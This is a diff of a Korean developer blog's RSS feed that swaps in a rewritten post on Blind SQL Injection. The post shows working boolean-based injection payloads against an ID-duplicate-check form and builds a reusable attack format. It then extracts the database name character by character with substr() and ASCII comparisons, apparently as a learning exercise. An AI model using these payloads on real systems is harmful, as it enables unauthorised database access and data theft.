@@ -1,87 +1,1239 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on ansis03의 개발 블로그</title><link>https://ansis03.github.io/posts/</link><description>Recent content in Posts on ansis03의 개발 블로그</description><generator>Hugo -- gohugo.io</generator><language>ko-kr</language><lastBuildDate>Sun, 08 Mar 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://ansis03.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Blind SQL Injection의 원리와 단계별 공격 과정</title><link>https://ansis03.github.io/posts/sql_injection/blind/</link><pubDate>Sun, 08 Mar 2026 00:00:00 +0000</pubDate><guid>https://ansis03.github.io/posts/sql_injection/blind/</guid><description>&lt;p&gt;&lt;strong&gt;Blind SQL Injection&lt;/strong&gt;은 UNION 방식이나 Error Based 방식과 달리, 데이터베이스의 응답 결과나 에러 메시지가 화면에 직접적으로 표시되지 않는 환경에서 사용하는 기법이다. 핵심은 쿼리에 대한 서버의 응답이 **참(True)**인지 **거짓(False)**인지에 따라 달라지는 점을 이용하는 것이다.&lt;/p&gt;
-&lt;p&gt;아이디 중복 검사 창이 대표적인 사례이다. 아이디 존재 여부에 따라 응답 결과가 달라지는 점을 활용한다.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%201.png"
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on ansis03의 개발 블로그</title><link>https://ansis03.github.io/posts/</link><description>Recent content in Posts on ansis03의 개발 블로그</description><generator>Hugo -- gohugo.io</generator><language>ko-kr</language><lastBuildDate>Wed, 10 Dec 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://ansis03.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Blind SQL Injection: 원리 이해부터 실전 데이터 추출까지</title><link>https://ansis03.github.io/posts/sql_injection/blind/</link><pubDate>Wed, 10 Dec 2025 00:00:00 +0000</pubDate><guid>https://ansis03.github.io/posts/sql_injection/blind/</guid><description>&lt;h1 id="blind-sql-injection"&gt;Blind SQL Injection
+&lt;/h1&gt;&lt;hr&gt;
+&lt;p&gt;UNION 방식과 ERROR Based 방식은 모두 응답 결과가 화면에 나왔다.&lt;/p&gt;
+&lt;p&gt;DB의 응답 결과가 화면에 보이지 않는 경우, Blind SQL Injection을 할 수 있다.&lt;/p&gt;
+&lt;p&gt;Blind SQL Injection의 핵심은 참/거짓의 응답결과가 다른 점을 이용하는 것이다.&lt;/p&gt;
+&lt;p&gt;아이디 중복을 검사하는 창이 대표적이다.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image.png"
 loading="lazy"
-alt="Fig 1. 아이디 중복 검사창 예시"
+alt="Fig 0."
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%202.png"
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%20201.png"
 loading="lazy"
-alt="Fig 2. 아이디 검색 결과에 따른 응답 차이"
+alt="Fig 201."
 &gt;&lt;/p&gt;
-&lt;p&gt;위와 같이 ID 검색 시 중복 여부에 따라 응답이 다르다면, 내부적으로 다음과 같은 쿼리가 실행될 것으로 예측할 수 있다.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;user_exists&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;userId&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[사용자 입력값]&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;h2 id="1-sql-injection-point-찾기"&gt;1. SQL Injection Point 찾기
-&lt;/h2&gt;&lt;p&gt;사용자의 입력값이 쿼리에 반영되는지 확인하기 위해 항등원인 &lt;code&gt;' and '1' = '1&lt;/code&gt;을 삽입한다.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%203.png"
+&lt;p&gt;이렇게 ID를 검색하면 중복 여부에 따라 응답 결과가 다르다.&lt;/p&gt;
+&lt;p&gt;중복을 확인 하려면 DB 에 접근 해야 할 것이고, 쿼리는 다음과 같을 것이다.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;~~~&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;~~~&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;userId&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;~~~~&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;여기서 중요한 점은 WHERE userId = ‘ ‘에 사용자의 파라미터가 들어가서 SQL이 실행된다는 것이다.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;항등원을 넣어보면,&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%20202.png"
 loading="lazy"
-alt="Fig 3. 항등원 삽입을 통한 Injection 포인트 확인"
+alt="Fig 202."
 &gt;&lt;/p&gt;
-&lt;p&gt;정상적으로 결과가 나온다면 Injection이 가능한 포인트이다. 효율적인 공격을 위해 다음과 같이 편리하게 수정 가능한 포맷을 설정한다.&lt;/p&gt;
+&lt;p&gt;이렇게 SQL Injection이 가능한 포인트임을 알 수 있다.&lt;/p&gt;
+&lt;p&gt;공격 포멧을 만들기 전에,&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (1=1) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and를 하나 더 만들어준다.&lt;/p&gt;
+&lt;p&gt;그 이유는 편리한 수정을 위해서&lt;/p&gt;
+&lt;p&gt;결과적으로 기본적인 포맷은 이러하다.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (조건) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;본격적인 탐색 전, &lt;code&gt;SELECT&lt;/code&gt; 문을 사용할 수 있는지 확인한다.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and ((select &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;) = &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%204.png"
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;이제 우리는 글자 하나 하나를 가져와서 맞는지 비교하는 작업을 할 것이다.&lt;/p&gt;
+&lt;p&gt;그 전에, SELECT 문을 사용 가능한지 확인해야 한다.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (조건) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and ((select &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;) = &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%20203.png"
 loading="lazy"
-alt="Fig 4. SELECT 문 정상 작동 확인"
+alt="Fig 203."
 &gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id="2-db-이름-찾기"&gt;2. DB 이름 찾기
-&lt;/h2&gt;&lt;p&gt;&lt;code&gt;select database()&lt;/code&gt;를 사용하고, 한 글자씩 찾아내기 위해 &lt;code&gt;substr()&lt;/code&gt; 함수를 이용한다.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;-- DB 이름을 가져와서 한 글자씩 비교하는 예시
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (substr((select database()), 1, 1) = &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%205.png"
+&lt;p&gt;select 문의 정상 작동을 확인하였다.&lt;/p&gt;
+&lt;p&gt;제일 처음 알아내야 할 것은 DB 이름이다.&lt;/p&gt;
+&lt;h3 id="db-이름-찾기"&gt;DB 이름 찾기
+&lt;/h3&gt;&lt;p&gt;select database() 를 사용하면 된다.&lt;/p&gt;
+&lt;p&gt;1 글자씩 찾아내기 위해 substr( , , )을 사용한다.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;test의&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;첫번째&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;글자&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;t&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;부터&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;한&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;글자를&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;가져오겠다&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;test의&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;두번째&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;글자&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;부터&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;한글자를&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;가져온다&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;결과적으로 알아올 db 이름을 찾는 함수인 select database()를 ‘test’ 자리에 넣으면 된다.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (조건) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;공격&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;포멧&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;DB&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;이름&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;찾기&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DB의&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;이름을&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="err"&gt;글자씩&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;탐색&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;database&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DB&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;이름&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;찾기&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;database&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DB의&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;이름을&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;찾아와서&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;한&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;글자씩&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;탐색&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;database&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;찾아온&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DB의&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;이름을&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;비교&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (substr((select database()), 1, 1) = &amp;#39;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;공격&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;포멧과&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;결합&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%20204.png"
 loading="lazy"
-alt="Fig 5. 첫 번째 글자 대조 (거짓 응답)"
+alt="Fig 204."
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%206.png"
+&lt;p&gt;‘a’는 거짓.&lt;/p&gt;
+&lt;p&gt;이걸 계속 바꿔줘야 한다. a b c d 이렇게.cj&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%20205.png"
 loading="lazy"
-alt="Fig 6. 첫 번째 글자 대조 (참 응답: ’s’)"
+alt="Fig 205."
 &gt;&lt;/p&gt;
-&lt;p&gt;글자를 하나씩 대조하는 대신 아스키(ASCII) 코드와 크기 비교를 활용하면 훨씬 빠르게 탐색할 수 있다.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;-- 첫 글자를 아스키 코드로 변환하여 60보다 큰지 비교
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="n"&gt;normaltic&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and (ascii(substr((select database()), 1, 1)) &amp;gt; 60) and &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; = &amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://ansis03.github.io/image/sql_injection/blind/image%207.png"
+&lt;p&gt;첫번째 글자가 ‘s’임을 알아냈다.&lt;/p&gt;
+&lt;p&gt;이걸 하나씩 비교하는게 아니라, 크기 비교를 통해 해결할 수 있다.&lt;/p&gt;
